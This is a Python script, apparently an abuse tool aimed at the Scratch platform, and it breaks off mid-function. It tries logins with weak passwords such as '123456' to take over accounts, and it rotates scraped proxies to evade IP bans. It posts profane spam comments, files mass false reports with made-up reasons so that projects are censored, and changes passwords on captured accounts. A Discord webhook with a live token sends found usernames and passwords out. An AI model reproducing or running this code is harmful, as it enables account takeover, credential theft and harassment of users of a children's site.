import requests
from bs4 import BeautifulSoup
import random
import scratchattach as sa
import threading
import queue
import re
import json
import time
from datetime import datetime

#settings

konter = 7

CHANGEPFP = True
DEBUGCOMMENT = False
DEBUGCOMMENTID = "1162831624"
PFPFILE = "pfpfile/ppanime1.png"
CHANGEDPFPFILE = "accountfiles/CHANGEDPFP.txt"
CHANGE_PASS = False
PASSWORD_FOR_CHANGING = "essaiscool"
TXT_FILE = f"accountfiles/accounts{konter}.txt"
FILEPROXY = "proxyonly.txt"
SPAM_MESSAGE = "ngentot kontol"#"Ꭼ‎‎‎‎‎ꓢ‎‎‎‎‎ꓢ‎‎‎‎‎Ꭺ‎‎‎‎‎" #"ꓣ‎‎‎‎‎Ꭼ‎‎‎‎‎Ꭺ‎‎‎‎‎ꓡ‎‎‎‎‎ Ꭼ‎‎‎‎‎ꓢ‎‎‎‎‎ꓢ‎‎‎‎‎Ꭺ‎‎‎‎‎ ꓲ‎‎‎‎‎ꓢ‎‎‎‎‎ ꓧ‎‎‎‎‎Ꭼ‎‎‎‎‎ꓣ‎‎‎‎‎Ꭼ‎‎‎‎‎ #Ꭼ‎‎‎‎‎ꓢ‎‎‎‎‎ꓢ‎‎‎‎‎Ꭺ‎‎‎‎‎"
SAVED_PROXY = ["185.140.12.38:80", "194.5.25.34:443", "203.144.144.146:8080", "101.32.14.101:1080", "118.27.111.97:80", "103.152.112.120:80", "143.244.56.83:10454", "194.5.25.34:443", "18.167.194.10:80", "200.106.124.97:999", "200.106.124.97:999", "92.255.107.53:8080"]
REPEAT_TIMES_XLIST = 20
PROXY_FAILED_WARN = False
PRINT_FAILEDS = False
AUTH_FOR_SCAN = {"username": "10program19", "password": "123456"}
DISCORD_WEBHOOK = False
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320569878905618464/D05eG4GICAL8zJW4epNO0cfYHoteVeixuD6gG1ZPjezph4fCWSsK9qbbYhzKKCXcfLvx"
PG_ALL_STUDENTS_IN_A_CLASS = True
PRINT_TRYING_TO_GET_CLASS = False
PROXY_FILE = "savedproxy.txt"
ROTATING_PROXY_SAVED = ["203.150.128.85:8080", "141.145.197.152:8888", "104.129.194.46:10005"]
ROTATING_PRINT = True
AMOUNT_SPAM_ACCOUNTS = 200
SCAN_FILE_PROXY  = True
AMOUNT_REPORT_ACCOUNTS = 100
#3PLACEHOLDER_PASSWORD = [
#"123456",
#"iloveyou",
#"123456789",
#"12345678",
#"1234567890",
#"1234567",
#"admin.",
#"123123",
#"qwerty",
#"abc123",
#"letmein",
#"monkey",
#"111111",
#"000000",
#"qwerty123",
#"dragon"]

PLACEHOLDER_PASSWORD = [
"123456",
"123456",
"123456",
"123456",
"123456",
"123456",
"123456",
"123456",
"123456",
"123456",
]

exitallpger = False
tryinghard = 0
gotaccounts = 0
q = queue.Queue()
valid_proxies = []
validprox = []
supervalidprox = ""
proxy = False
usernametospam = []
spams = False
reportproject = False
spamtype = "profile"
randomchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTU"
itsfailed = 0
warns = 1
printfaileds = PRINT_FAILEDS
testingproxy = False
istimeout = False
working_proxies = []
timeout2 = False
working_proxy_formatted = []
ip_verified = False
rotating_proxy = []
rotating_proxebools = False
rotating_proxy_list = queue.Queue()
autolove = False
spamreq = 0
whaterror = []
whaterrorreport = []
already_printed_username = []
already_printed_proxy = []
isprojectcensored = False
list_of_proxies = []
list_account_for_reports = []
list_proxies_for_reports = []
thumbnailidd = f"{random.randint(100000000, 1000000000000000000000000000)}{randomchars[random.randint(0, len(randomchars) - 1)]}{random.randint(100000000, 1000000000000000000000000000)}{randomchars[random.randint(0, len(randomchars) -1)]}"
password_placeholder_report = []

if SCAN_FILE_PROXY == True:
    with open(FILEPROXY) as f:
        #list_of_proxies = []
        list_of_proxiessssssssssss = f.readlines()
        for i in list_of_proxiessssssssssss:
            if not i.strip() in list_of_proxies:
                list_of_proxies.append(i.strip())

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
    "x-csrftoken": "a",
    "x-requested-with": "XMLHttpRequest",
    "referer": "https://scratch.mit.edu",
}

randomreason = [
  "Alien interference with my Wi-Fi.","Coffee machine ate my report files.","Time travel caused system issues.","Printer jammed right before deadline.","Laptop froze during crucial task.","Wi-Fi went down in the middle.","My report was deleted mysteriously.","Server room malfunctioned again.","Computer crashed during save time.","File got lost in the digital world.","Printer decided to take a break.","My mouse ran away during work.","Report vanished into cyberspace.","Wi-Fi stopped working right away.","Cat stepped on my keyboard, sorry.","Time loop corrupted all my work.","The server shut down unexpectedly.","Coffee machine malfunctioned badly.","Laptop froze when I clicked save.","Printer went on strike today, sorry.","Ghosts erased all of my files.","Wi-Fi disconnected without warning.","Laptop crashed when editing report.","Report got lost in a digital vortex.","My keyboard glitched and typed wrong.","A bug deleted all my report files.","Printer chewed up all my documents.","Time portal sucked my report in.","System down due to tech failure.","Laptop caught a virus, sorry.","File got corrupted by system bug.","Wi-Fi signal dropped randomly today.","File disappeared for no reason.","Report vanished right before saving.","Glitch erased all my important work.","Printer jammed during print job.","Server malfunctioned during upload.","Wi-Fi suddenly stopped working again.","Laptop crashed unexpectedly mid-task.","Report corrupted by system glitch.","Wi-Fi dropped out during deadline.","Printer malfunctioned right on time.","System crash erased all my work.","My mouse refused to work today.","Document mysteriously disappeared.","Wi-Fi signal lost at critical time.","Server went offline during work.","Printer ate my documents, sorry.","Laptop crashed while saving file.","Wi-Fi stopped working during task.","Document corrupted during upload.","Laptop ran out of power, sorry.","Report vanished without a trace.","Server went offline during session.","Printer refused to print my work.","Wi-Fi randomly disconnected today.","The file corrupted during saving.","My keyboard typed randomly, sorry.","Report lost in a tech mishap today.","Glitch caused report deletion today.","Printer jammed in the middle, sorry.","My files got corrupted mysteriously.","Wi-Fi lost connection randomly today.","Laptop froze during important task.","Report disappeared into thin air.","Printer malfunctioned during print.","System error erased everything, sorry.","Wi-Fi signal cut off randomly today.","File corrupted during final save.","Laptop crashed in the middle of work.","Wi-Fi dropped out during deadline.","My mouse stopped working again, sorry.","Report vanished right before saving.","Printer jammed right at deadline.","My file disappeared for no reason.","Glitch in system erased my report.","Laptop crashed unexpectedly during task.","Wi-Fi signal dropped at the wrong time.","Time travel bug erased my file.","Printer chewed up my documents today.","Laptop got attacked by malware, sorry.","Wi-Fi disconnected in the middle.","Report got lost during transfer.","Printer malfunctioned before print.","Laptop froze in the middle of task.","The Wi-Fi signal disappeared today.","Report corrupted during editing.","Time loop erased all my work today.","Server crashed when I needed it most.","The file corrupted after saving it.","Laptop ran out of power mid-task.","Report was eaten by a tech glitch.","Wi-Fi randomly disconnected again today.","Printer jammed during the job, sorry.","My mouse stopped working unexpectedly.","Report corrupted during file transfer.","Wi-Fi dropped out unexpectedly today.","Printer refused to print my file today.","Laptop froze and lost everything.","Server went down at critical time."
]

#https://api.scratch.mit.edu/studios/5842709/curators/?limit=40&offset=0

#with open("proxy-list.txt", "r") as f:
 #   proxies = f.read().split("\n")
  #  for p in proxies:
   #     q.put(p)

class ScratchSession:
    def __init__(self, username=None, password=None, session_id=None, token=None, proxy=None, numbers=None):
        self.logged_in = False
        self.username = username
        self.session_id = session_id
        self.csrf_token = None
        self.token = token
        self.proxy = proxy
        self.numbers = numbers
        self._headers = headers
        self.password = password
        self._cookies = {
            "scratchsessionsid" : self.session_id,
            "scratchcsrftoken" : "a",
            "scratchlanguage" : "en",
            "accept": "application/json",
            "Content-Type": "application/json",
        }
        #try:
        #    self._headers.pop("Cookie")
        #except Exception: pass
        if password:
            self.login(password)

        #if self.session_id or self.token:
          #  self.get_csrf_token()
           # self.logged_in = True

    def login(self, password):
        # logs in to Scratch
        headers = {
            "x-csrftoken": "a",
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "scratchcsrftoken=a;scratchlanguage=en;",
            "referer": "https://scratch.mit.edu",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
        }
        data = json.dumps({"username": self.username, "password": password})
        itssucess = False
        try:
            request = requests.post(
                "https://scratch.mit.edu/login/", data=data, headers=headers, proxies={"http":self.proxy, "https":self.proxy}, timeout=5
            )
            itssucess = True
        except:
            whaterror[self.numbers] = -2
            #raise Exception("error processing proxy")
        if itssucess == True:
            try:
                self.session_id = re.search('"(.*)"', request.headers["Set-Cookie"]).group()
                self.token = request.json()[0]["token"]
                self._cookies["scratchsessionsid"] = self.session_id
                self._headers["X-Token"] = self.token
                try:
                    self.get_csrf_token()
                except:
                    pass
                #print(self._cookies)
            except AttributeError:
                #if not self.username in already_printed_username:
                 #   already_printed_username.append(self.username)
                raise "error lol lmao"
                #whaterror[self.numbers] = -1
            #raise Exception("Your password or username is incorrect")
        #self._get_xtoken()

    def get_csrf_token(self):
        headers = {
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "scratchlanguage=en;permissions=;",
            "referer": "https://scratch.mit.edu",
        }

        request = requests.get("https://scratch.mit.edu/csrf_token/", headers=headers, proxies={"http":self.proxy, "https":self.proxy}, timeout=5)

        self.csrf_token = re.search(
            "scratchcsrftoken=(.*?);", request.headers["Set-Cookie"]
        ).group(1)
        #print(self.csrf_token)
        self._headers["x-csrftoken"] = self.csrf_token
        self._cookies["scratchcsrftoken"] = self.csrf_token
        whaterror[self.numbers] = 1

    def reportproject(self, projectid, thumbnailid):
        global isprojectcensored
        if not self._cookies["scratchsessionsid"] == None:
            itssucess = False
            reaons = randomreason[random.randint(0, len(randomreason) - 1)]
            datar = {"report_category":"19","notes":f"{random.randint(10000, 99999)} {reaons}","thumbnail":thumbnailid}
            try:
                headers = self._headers
                headers["accept"] = "application/json"
                headers["Content-Type"] = "application/json"
                cookies = self._cookies
                #cookies["scratchpolicyseen"] = "true"
                request = requests.post(f"https://api.scratch.mit.edu/proxy/projects/{projectid}/report/", headers=headers, data=json.dumps(datar), proxies={"http":self.proxy, "https":self.proxy}, cookies=cookies, timeout=5)
                itssucess = True
                whaterrorreport[self.numbers] = 1
            except:
                whaterrorreport[self.numbers] = -1
            # print(self._headers)
            if itssucess == True:
                print(f"{request.status_code} with proxy {self.proxy} reason {datar['notes']}")
                #print(cookies)
                print(request.json())
                if request.json()["success"] == True:
                    print("success reported!")
                    if request.json()["moderation_status"] == "censored":
                        isprojectcensored = True
                        for i in range(1000):
                            print("PROJECT SUCCESSFULLY DOWN!!!")

    def post_comment_studio(self, comment, studioid):
        datar = {"content": comment, "parent_id": "", "commentee_id": ""}
        headers = self._headers
        headers["accept"] = "application/json"
        headers["Content-Type"] = "application/json"
        headers["referer"] = "https://scratch.mit.edu/studios/" + str(studioid)
        request = requests.post(f"https://api.scratch.mit.edu/proxy/comments/studio/{studioid}/", headers=headers, data=json.dumps(datar), proxies={"http":self.proxy, "https":self.proxy}, cookies=self._cookies, timeout=5)
        # print(self._headers)
        print(request.status_code)

    def post_comment_profile(self, comment, username):
        datar = {"content": comment, "parent_id": "", "commentee_id": ""}
        headers = self._headers
        headers["accept"] = "application/json"
        headers["Content-Type"] = "application/json"
        headers["referer"] = "https://scratch.mit.edu/users/" + str(username)
        request = requests.post(f"https://scratch.mit.edu/site-api/comments/user/{username}/add/", headers=headers, data=json.dumps(datar), proxies={"http":self.proxy, "https":self.proxy}, cookies=self._cookies, timeout=5)
        # print(self._headers)
        print(f"{request.status_code} {self.proxy}")

    def get_csrf_token2(self):
        headers = {
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "scratchlanguage=en;permissions=;",
            "referer": "https://scratch.mit.edu",
        }

        request = requests.get("https://scratch.mit.edu/csrf_token/", headers=headers, proxies={"http":self.proxy, "https":self.proxy}, timeout=5)

        self.csrf_token = re.search(
            "scratchcsrftoken=(.*?);", request.headers["Set-Cookie"]
        ).group(1)
        #print(self.csrf_token)
        self._headers["x-csrftoken"] = self.csrf_token
        self._cookies["scratchcsrftoken"] = self.csrf_token
        #print(self._headers)
        #print(self._cookies)
        return self.csrf_token

    def change_password(self, new_password):
        if not self._cookies["scratchsessionsid"] == None:
            cookies = self._cookies
            headers = self._headers
            middleware = self.get_csrf_token2()
            datasr = {"csrfmiddlewaretoken": middleware, "old_password": self.password, "new_password1": new_password, "new_password2": new_password}
            headers["referer"] = "https://scratch.mit.edu/accounts/password_change/"
            headers["content-type"] = "application/x-www-form-urlencoded"
            headers["origin"] = "https://scratch.mit.edu"
            response = requests.post("https://scratch.mit.edu/accounts/password_change/", cookies=cookies, headers=headers, data=datasr)
            try:
                print(response.json())
            except:
                pass

def reportpro(proxy, account, password, projectid, numbers):
    if not proxy in already_printed_proxy:
        print(f"trying with proxy {proxy} and account {account} password {password} and id {numbers}")
        already_printed_proxy.append(proxy)
    while True:
        if str(whaterror[numbers]) == "1":
            break
        try:
            session = ScratchSession(account, password, proxy=proxy, numbers=numbers)
        except:
            pass
        if not str(whaterror[numbers]) == "0":
            if not str(whaterror[numbers]) == "-2":
                if str(whaterror[numbers]) == "1":
                    if not account in already_printed_username:
                        print(f"sucessfully logged into account for reporting {placeholderspam} " + account)
                        already_printed_username.append(account)
                        break
                if str(whaterror[numbers]) == "-1":
                    print("failed to login2")
                    break
    while True:
        if str(whaterrorreport[numbers]) == "1":
            break
        try:
            #session.reportprojectoption(projectid, thumbnailidd)
            session.reportproject(projectid, thumbnailidd)
        except:
            pass
        if str(whaterrorreport[numbers]) == "1":
            break

def change_pfp(file, session=None,username=None, password=None):
        if session:
            session = session
        else:
            for iiiii in range(5):
                try:
                    session = ScratchSession(username, password)
                    break
                except:
                    pass
        with open(file, "rb") as f:
            thumbnail = f.read()

        filename = file.replace("\\", "/")
        if filename.endswith("/"):
            filename = filename[:-1]
        filename = filename.split("/").pop()

        file_type = filename.split(".").pop()

        payload1 = f'------WebKitFormBoundaryhKZwFjoxAyUTMlSh\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\nContent-Type: image/{file_type}\r\n\r\n'
        payload1 = payload1.encode("utf-8")
        payload2 = b"\r\n------WebKitFormBoundaryhKZwFjoxAyUTMlSh--\r\n"
        payload = b"".join([payload1, thumbnail, payload2])
        try:
            r = requests.post(
                f"https://scratch.mit.edu/site-api/users/all/{session.username}/",
                headers={
                    "accept": "*/",
                    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryhKZwFjoxAyUTMlSh",
                    "Referer": "https://scratch.mit.edu/",
                    "x-csrftoken": session.csrf_token,
                    "x-requested-with": "XMLHttpRequest",
                },
                data=payload,
                cookies=session._cookies,
                timeout=10,
            )
            try:
                print(r.json())
                with open(CHANGEDPFPFILE) as f:
                    data = f.readlines()
                    readldata = []
                    for ii in data:
                        readldata.append(ii.strip())
                if not session.username in readldata:
                    with open(CHANGEDPFPFILE, "a") as f:
                        f.write(f"{session.username}\n")
            except:
                pass
            try:
                print(r)
            except:
                pass
        except:
            pass

def reportlol():
    i_ = 0
    for i in list_account_for_reports:
        threading.Thread(target=reportpro,args=(list_proxies_for_reports[i_],i,PLACEHOLDER_PASSWORD[password_placeholder_report[i_]],placeholderspam,i_,)).start()
        i_ = i_ + 1

def login(username, password, proxy):
    global itsfailed
    global warns
    global istimeout
    global working_proxies
    global testingproxy
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
        "x-csrftoken": "a",
        "x-requested-with": "XMLHttpRequest",
        "referer": "https://scratch.mit.edu",
    }

    data = json.dumps({"username": username, "password": password})
    _headers = headers
    _headers["Cookie"] = "scratchcsrftoken=a;scratchlanguage=en;"

    #url = "https://scratch.mit.edu/login/"
    #payload = {'source': 'universal','url': url ,'geo_location': '90210', "headers": _headers}
    statuslol = False
    if PROXY_FAILED_WARN == True or testingproxy == True:
        if istimeout == False:
            try:
                request = requests.post(
                    "https://scratch.mit.edu/login/", data=data, headers=_headers, proxies={"http":proxy, "https":proxy}
                )
                if testingproxy == True:
                    working_proxies.append(proxy)
                    if istimeout == False:
                        print("success to get " + proxy)
                statuslol = True
            except:
                if istimeout == False:
                    print("failed to get " + proxy)
                statuslol = False
    else:
        try:
            request = requests.post(
                "https://scratch.mit.edu/login/", data=data, headers=_headers, proxies={"http":proxy, "https":proxy}
            )
            statuslol = True
        except:
            statuslol = False
    #print(request.headers)
    if statuslol == True:
        try:
            session_id = str(re.search('"(.*)"', request.headers["Set-Cookie"]).group())
            return "success"
        except:
            if istimeout == False:
                raise Exception("failed because username or password are not valid")
    else:
        if istimeout == False and testingproxy == True:
            print("failed to get " + proxy)
        #raise Exception("failed because username or password are not valid")

def fetch_user_details(username):
    """Fetch user details from Scratch API."""
    url = f"https://api.scratch.mit.edu/users/{username}"
    response = requests.get(url)
    response.raise_for_status()
    return response.json()

def send_webhook_notification(follower_details, password):
    """Send a webhook notification to Discord with follower details."""
    data = {
        "content": "@everyone",
        "embeds": [
            {
                "title": "New Account Found",
                "fields": [
                    {"name": "Username", "value": follower_details['username']},
                    {"name": "Joined", "value": follower_details['joined']},
                    {"name": "Found", "value": follower_details['found']},
                    {"name": "Password", "value": password},
                    {"name": "Followers", "value": follower_details['followers']},
                    {"name": "Scratcher", "value": follower_details['scratcher']},
                ],
                "thumbnail": {"url": follower_details['thumbnail']},
            }
        ]
    }
    
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=data, headers={"Content-Type": "application/json"})
        response.raise_for_status()
        print(f"Webhook sent for {follower_details['username']}")
    except requests.RequestException as e:
        print(f"Failed to send webhook for {follower_details['username']}: {e}")

def send_webhook(username):
    user_details = fetch_user_details(username)
    # Get the join date in Unix time
    join_date = datetime.strptime(user_details['history']['joined'], '%Y-%m-%dT%H:%M:%S.000Z')
    joined_unix = int(join_date.timestamp())
            
    # Get current time when found
    found_unix = int(time.time())  # Current Unix timestamp
    user = sa.get_user(username)
    user.follower_count()
    user.is_new_scratcher()
    # Prepare data for the webhook
    follower_details = {
        'username': username,
        'joined': f"<t:{joined_unix}:R>",  # Use Discord timestamp format
        'found': f"<t:{found_unix}:R>",  # Current time when the account was found
        'thumbnail': user_details['profile']['images']['90x90'],
        'followers': user.follower_count(),
        'scratcher': not user.is_new_scratcher(),
    }
    send_webhook_notification(follower_details)

freeproxxy = []

def getprox1():
    try:
        response5 = requests.get("https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies.json")
        for i in response5.json():
            freeproxxy.append(str(i["exit_ip"]) + ":" + str(i["port"]))
    except:
        pass
def getprox2():
    try:
        response6 = requests.get("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/https/data.json")
        for i in response6.json():
            freeproxxy.append(str(i["ip"]) + ":" + str(i["port"]))
    except:
        pass
def getprox3():
    try:
        response = requests.get("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc")
        for i in response.json()["data"]:
            freeproxxy.append(str(i["ip"]) + ":" + str(i["port"]))
    except:
        pass
def getprox4():
    try:
        response2 = requests.get("https://api.lumiproxy.com/web_v1/free-proxy/list?page_size=1710&page=1&language=en-us")
        for i in response2.json()["data"]["list"]:
            freeproxxy.append(str(i["ip"]) + ":" + str(i["port"]))
    except:
        pass
def getprox5():
    try:
        response2 = requests.get("https://sunny9577.github.io/proxy-scraper/proxies.json")
        for i in response2.json():
            freeproxxy.append(str(i["ip"]) + ":" + str(i["port"]))
    except:
        pass

def get_many_proxy():
    global freeproxxy
    threading.Thread(target=getprox1).start()
    threading.Thread(target=getprox2).start()
    threading.Thread(target=getprox3).start()
    threading.Thread(target=getprox4).start()
    threading.Thread(target=getprox5).start()
    time.sleep(5)
    proxies = freeproxxy
    return proxies


def get_free_proxies():
    url = "https://free-proxy-list.net/"
    # request and grab content
    soup = BeautifulSoup(requests.get(url, timeout=5).content, 'html.parser')
    # to store proxies
    proxies = []
    for row in soup.find("table", attrs={"class": "table-striped"}).find_all("tr")[1:]:
        tds = row.find_all("td")
        try:
            ip = tds[0].text.strip()
            port = tds[1].text.strip()
            countries = tds[2].text.strip()
            proxies.append(str(ip) + ":" + str(port))
        except IndexError:
            continue
    return proxies

def get_free_proxies_server2():
    response = requests.get("https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc", timeout=5)
    proxies = []
    for i in response.json()["data"]:
        proxies.append(str(i["ip"]) + ":" + str(i["port"]))
    return proxies

def justanormalrequest(url, proxy):
    try:
        requests.get(url, proxies={"http":proxy, "https":proxy})
        print("success with proxy "+ proxy)
    except:
        print("failed with proxy " + proxy)

def timeout_checkproxy(sec):
    global istimeout
    time.sleep(sec)
    istimeout = True

def scanning(proxies):
    for i in range(len(proxies)):
        #printing req number
        proxy = proxies[i]
        print("Request for " + proxy)
        threading.Thread(target=login, args=(AUTH_FOR_SCAN["username"],AUTH_FOR_SCAN["password"],proxy,)).start()
        #threading.Thread(target=justanormalrequest, args=("https://scratch.mit.edu/classes/100000/",proxy,)).start()

def timeout_2(sec):
    global timeout2
    timeout2 = False
    time.sleep(sec)
    timeout2 = True

def scanning_country(ips):
    global working_proxy_formatted
    global timeout2
    global q
    global rotating_proxy
    url = "https://ipapi.co/json/"

    while not q.empty():
        i = q.get()
        if timeout2 == False:
            try:
                myip = requests.get("https://api.iplocation.net/?cmd=get-ip", proxies={"http":i, "https":i}).json()
                ipcountry = requests.get(f"https://api.iplocation.net/?ip={myip["ip"]}", proxies={"http":i, "https":i}).json()
                working_proxy_formatted.append(f"proxy: {i}, country_name: {ipcountry["country_name"]}")
                rotating_proxy.append(i)
                #list_of_proxies.append(i)
                if timeout2 == False:
                    print("success to get country for ip " + i)
            except requests.RequestException as e:
                if timeout2 == False:
                    print("failed to get country for ip " + i)

def check_proxies():
    global istimeout
    global working_proxies
    global supervalidprox
    global testingproxy
    global working_proxy_formatted
    global q
    global ip_verified
    global rotating_proxy
    global rotating_proxebools
    testingproxy = True
    try:
        proxies = get_free_proxies()
        print("success to get proxy server 1")
    except:
        print("failed to get proxy server 1")
    try:
        proxies2 = get_free_proxies_server2()
        print("success to get proxy server 2")
        for i in proxies2:
            proxies.append(i)
    except:
        print("failed to get proxy server 2")
    try:
        proxies3 = get_many_proxy()
        print("success to get proxy server 3")
        for i in proxies3:
            proxies.append(i)
    except:
        print("failed to get proxy server 3")
    time.sleep(1.5)
    print(testingproxy)

    print(f"found {len(proxies)} proxies")
    print(f"waiting for timeout...")
    scanning(proxies)
    timeout_checkproxy(30)
    print("\ntimeout.\n")
    if len(working_proxies) > 0:
        print(f"found {len(working_proxies)} proxies")
        #print("using the first found working proxy " + working_proxies[0])
        if input("autopick or pick y/n: ") == "y":
            print("using the first found working proxy " + working_proxies[0])
            supervalidprox = working_proxies[0]
            if supervalidprox in working_proxies:
                ip_verified = True
        else:
            if input("scan for countries y/n: ") == "y":
                print("scanning for countries...")
                for i in working_proxies:
                    q.put(i)
                for _ in range(10):
                    threading.Thread(target=scanning_country, args=(working_proxies,)).start()
                print("waiting for timeout...")
                timeout_2(30)
                for i in working_proxies:
                    print(i)
                for i in working_proxy_formatted:
                    print(i)
                if input("use rotating proxy y/n: ") == "y":
                    print("your proxies will be rotated every request")
                    rotating_proxebools = True
                    supervalidprox = rotating_proxy[random.randint(0, len(rotating_proxy) - 1)]
                    if supervalidprox in working_proxies:
                        ip_verified = True
                else:
                    supervalidprox = input(f"\npick these proxies: ")
                    print("using proxy " + supervalidprox)
                if supervalidprox in working_proxies:
                    ip_verified = True
                if input("save these proxies y/n: ") == "y":
                    for i in working_proxies:
                        with open(PROXY_FILE, "a") as f:
                            f.write(f"{i}\n")
                    print("saved! to " + PROXY_FILE)
            else:
                for i in working_proxies:
                    print(i)
                if input("using proxy y/n: ") == "y":
                    if input("use rotating proxy y/n: ") == "y":
                        print("your proxies will be rotated every request")
                        rotating_proxebools = True
                        supervalidprox = working_proxies[random.randint(0, len(working_proxies) - 1)]
                        if supervalidprox in working_proxies:
                            ip_verified = True
                    else:
                        supervalidprox = input(f"\npick these proxies: ")
                        print("using proxy " + supervalidprox)
                else:
                    for i in working_proxies:
                        list_of_proxies.append(i)
                    print("ok all proxies saved on list list_of_proxies")
        testingproxy = False
        istimeout = True

#def check_proxies():
 #   global q
  #  global supervalidprox
   # howmanytry = input("try to get how many proxy: ")
    #for i in range(int(howmanytry)):
     #   proxy = q.get()
      #  try:
       #     res = requests.get("http://ipinfo.io/json",
   #                            proxies={"http": proxy,
    #                                    "https": proxy})
    #    except:
     #       continue
      #  if res.status_code == 200:
       #     print(proxy)
        #    validprox.append(proxy)
         #   with open("validproxy.txt", "a") as f:
          #      f.write(f"{proxy}\n")
#    if len(validprox) > 0:            
 ##       print("Successfully now check if it work for pging...")
   #     for pp in validprox:
    #        try:
     #           res = requests.get("https://scratch.mit.edu/users/khairal/",
      #                          proxies={"http": pp,
       #                                 "https": pp})
        #    except:
         #       continue
          #  if res.status_code == 200:
           #     print(f"Successfully now your ip will changed to {pp}")
            #    supervalidprox = pp
             #   break
                
 #       if supervalidprox == "":
  #          print(f"Proxy failed to get")
   # else:
    #    print("Proxy failed to get")

hastimeout = False
working_proxie_scan = []

def scanproxyipban(proxy):
    global hastimeout
    global working_proxie_scan
    try:
        if hastimeout == False:
            res = requests.get("https://scratch.mit.edu/users/khairal/", proxies={"http":proxy, "https":proxy})
            if res.status_code == 200:
                if hastimeout == False:
                    working_proxie_scan.append(proxy)
                    print(f"proxy {proxy} not banned from scratch")
            else:
                if hastimeout == False:
                    print(f"proxy {proxy} is banned from scratch code {res.status_code}")
    except:
        if hastimeout == False:
            print(f"proxy {proxy} is banned from scratch or proxy has failed")

def scanrotatedproxy():
    print("scanning...")
    global hastimeout
    global rotating_proxy_list
    while not rotating_proxy_list.empty():
        myproxy_ishere = rotating_proxy_list.get()
        threading.Thread(target=scanproxyipban,args=(myproxy_ishere,)).start()
    time.sleep(30)
    hastimeout = True
    print("\ntimeout\n")

checkproxy = input(f"checking for proxies (found {len(list_of_proxies)} in proxy file): ")
if checkproxy == "y":
    checkorno = input("from saved proxy y/n: ")
    if checkorno == "y":
        if input("use saved rotating proxy y/n: ") == "y":
            rotating_proxebools = True
            rotating_proxy = ROTATING_PROXY_SAVED
            supervalidprox = list_of_proxies[random.randint(0, len(list_of_proxies) - 1)]
            ip_verified = True
            for i in rotating_proxy:
                rotating_proxy_list.put(i)
            #scanrotatedproxy()
            #if input("use saved rotating proxy or input proxy y/n: ") == "y":
             #   rotating_proxebools = True
              #  ip_verified = True
               # supervalidprox = rotating_proxy[random.randint(0, len(rotating_proxy) - 1)]
                #print("using rotating proxy")
            #else:
             #   supervalidprox = input("input your proxy: ")
              #  rotating_proxebools = False
        else:
            supervalidprox = SAVED_PROXY[-1]
            print(f"using the last proxy in the list {SAVED_PROXY[-1]}")
    else:
    #for _ in range(10):
        testingproxy = True
        check_proxies()


if input("spam with account pged y/n (not working with proxy): ") == "y":
    spams = True
    if input("spam on studio or profile y/n: ") == "y":
        spamtype = "studio"
        placeholderspam = input("studio id: ")
        print("spam activated in studio")
    else:
        placeholderspam = input("username: ")
        print("spam activated in profile")

if input("report with account pged y/n: ") == "y":
    reportproject = True
    placeholderspam = input("project id: ")
    print(f"report activated in project, found {len(list_of_proxies)} fornow")

#if input("print faileds y/n: ") == "y":
 #   printfaileds = True
  #  print("print failed enabled!")
#else:
 #   print("print failed disabled!")

#resss = requests.get("https://scratch.mit.edu", proxies={"http": "204.44.83.138:6656",
#                                                                        "https": "204.44.83.138:6656"}).json()
#print(resss)


def checkipban():
    global ip_verified
    if supervalidprox == "":
        myip = requests.get("https://api.iplocation.net/?cmd=get-ip").json()
        ipcountry = requests.get(f"https://api.iplocation.net/?ip={myip["ip"]}").json()
    else:
        if True == True:
            myip = requests.get("https://api.iplocation.net/?cmd=get-ip", proxies={"http":supervalidprox, "https":supervalidprox}).json()
            ipcountry = requests.get(f"https://api.iplocation.net/?ip={myip["ip"]}").json()
        else:
            myip = {"ip": supervalidprox}
            ipcountry = requests.get(f"https://api.iplocation.net/?ip={myip["ip"]}").json()
    print(f"your ip address is: {myip["ip"]}")
    print(f"ip country is: {ipcountry["country_name"]}")
    if supervalidprox == "":
        res = requests.get("https://scratch.mit.edu/users/khairal/")
        if res.status_code == 200:
            print("your ip is not banned")
            return True
        else:
            if input(f"your ip is banned code {res.status_code} bypass:") == "y":
                return True
            else:
                return False
    else:
        if True == True:
            res = requests.get("https://scratch.mit.edu/users/khairal/", proxies={"http":supervalidprox, "https":supervalidprox})
            if res.status_code == 200:
                print(f"your ip is not banned (proxy working) anjing mewing {supervalidprox}")
                return True
            else:
                if input(f"your ip is banned code {res.status_code} bypass:") == "y":
                    return True
                else:
                    return False
        else:
            print("your ip is not banned (proxy working)")
            return True

isbanned = True
givenuser = ""

print("checking for ip ban...")

if checkipban() == True:
    haha = input("autofollow y/n (user will not added into txt file) (not working with proxy): ")
    isbanned = False
    if haha == "y":
        autofol = True
        givenuser = input("user: ")
        isbanned = False
    else:
        autofol = False
    awokawok = input("autolove(favorite) (not working with change password) y/n: ")
    if awokawok == "y":
        autolove = True
        givenuser = input("project id: ")
else:
    if supervalidprox == "":
        quit()

kegagalan = []
globalsuccessspam = []

def followeee(session):
    try:
        session.follow()
        print("successfully to follow")
    except:
        pass

def post_comen(session, myid):
    #global globalsuccessspam
    try:
        session.post_comment(f"{random.randint(1000, 9999)} {SPAM_MESSAGE}")
        print(f"posting tpi gtw bisa apa kg {spamtype} id: {placeholderspam}")
    except:
        print("failed to posting")
    #globalsuccessspam[myid] = globalsuccessspam[myid] + 1

def favss(session):
    try:
        session.favorite()
